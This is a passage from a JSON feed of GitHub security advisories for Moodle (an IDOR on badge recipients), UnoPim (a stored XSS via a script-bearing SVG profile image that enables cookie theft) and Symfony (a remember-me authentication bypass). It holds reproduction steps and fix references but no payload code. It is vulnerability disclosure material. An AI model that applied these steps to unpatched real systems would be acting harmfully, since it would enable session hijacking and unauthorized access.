            "content_html": "<p>A vulnerability was found in Moodle. Additional checks are required to ensure users with permission to view badge recipients can only access lists of those they are intended to have access to.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-48900\">https://nvd.nist.gov/vuln/detail/CVE-2024-48900</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2318818\">https://bugzilla.redhat.com/show_bug.cgi?id=2318818</a></li>\n<li><a href=\"https://moodle.org/mod/forum/discuss.php?d=462879\">https://moodle.org/mod/forum/discuss.php?d=462879</a></li>\n<li><a href=\"http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-83178\">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-83178</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g8r3-2v89-j6r5\">https://github.com/advisories/GHSA-g8r3-2v89-j6r5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g8r3-2v89-j6r5",
            "title": "[moodle/moodle] Moodle IDOR when accessing list of badge recipients",
            "date_modified": "2024-11-13T18:38:38.000Z",
            "date_published": "2024-11-13T15:31:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g8r3-2v89-j6r5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A vulnerability exists in the Create User process, allowing the creation of a new admin account with an option to upload a profile image. An attacker can upload a malicious SVG file containing an embedded script. When the profile image is accessed, the embedded script executes, leading to the potential theft of session cookies.</p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Login as admin</li>\n<li>Go to Create User</li>\n<li>Fill up everything in the registration form then upload SVG image as a profile picture</li>\n<li>In SVG image, add script tag to prepare for XSS attack</li>\n<li>Complete the Create User process</li>\n<li>Right click at the image to obtain image URL address</li>\n<li>XSS triggered</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<p>The below link is a private YouTube video for PoC. \n<a href=\"https://youtu.be/5j8owD0--1A\">https://youtu.be/5j8owD0--1A</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>The stored XSS can lead to session hijacking and privilege escalation, effectively bypassing any CSRF protections in place.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/unopim/unopim/security/advisories/GHSA-cgr4-c233-h733\">https://github.com/unopim/unopim/security/advisories/GHSA-cgr4-c233-h733</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-52305\">https://nvd.nist.gov/vuln/detail/CVE-2024-52305</a></li>\n<li><a href=\"https://github.com/unopim/unopim/commit/9a0da7a0892c60f58df2351b5a9498dcb4cb8b7a\">https://github.com/unopim/unopim/commit/9a0da7a0892c60f58df2351b5a9498dcb4cb8b7a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgr4-c233-h733\">https://github.com/advisories/GHSA-cgr4-c233-h733</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgr4-c233-h733",
            "title": "[unopim/unopim] UnoPim Stored XSS : Cookie hijacking through Create User function",
            "date_modified": "2024-11-13T18:37:16.000Z",
            "date_published": "2024-11-13T18:37:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgr4-c233-h733"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"description\">Description</h3>\n<p>When consuming a persisted remember-me cookie, Symfony does not check if the username persisted in the database matches the username attached with the cookie, leading to authentication bypass.</p>\n<h3 id=\"resolution\">Resolution</h3>\n<p>The <code>PersistentRememberMeHandler</code> class now ensures the submitted username is the cookie owner.</p>\n<p>The patch for this issue is available <a href=\"https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a\">here</a> for branch 5.4.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>We would like to thank Moritz Rauch - Pentryx AG for reporting the issue and Jérémy Derussé for providing the fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/symfony/symfony/security/advisories/GHSA-cg23-qf8f-62rr\">https://github.com/symfony/symfony/security/advisories/GHSA-cg23-qf8f-62rr</a></li>\n<li><a href=\"https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a\">https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/security-http/CVE-2024-51996.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/security-http/CVE-2024-51996.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-51996.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-51996.yaml</a></li>\n<li><a href=\"https://symfony.com/cve-2024-51996\">https://symfony.com/cve-2024-51996</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51996\">https://nvd.nist.gov/vuln/detail/CVE-2024-51996</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cg23-qf8f-62rr\">https://github.com/advisories/GHSA-cg23-qf8f-62rr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cg23-qf8f-62rr",
            "title": "[symfony/security-http] Symfony has an Authentication Bypass via RememberMe",
            "date_modified": "2024-11-14T23:55:43.000Z",
            "date_published": "2024-11-13T18:29:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cg23-qf8f-62rr"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}